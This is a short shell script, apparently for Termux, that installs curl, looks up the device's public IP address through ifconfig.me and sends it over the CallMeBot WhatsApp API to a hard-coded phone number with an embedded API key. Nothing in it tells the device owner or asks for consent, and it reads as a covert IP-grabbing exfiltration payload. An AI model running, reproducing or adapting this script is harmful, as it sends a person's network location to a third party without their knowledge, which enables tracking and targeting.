pkg install curl -y
curl ifconfig.me >> yel.txt
ket=$(cat yel.txt)
sleep 5.0
curl -s -1 "https://api.callmebot.com/whatsapp.php?phone=+919990212082&text=$ket&apikey=858089"
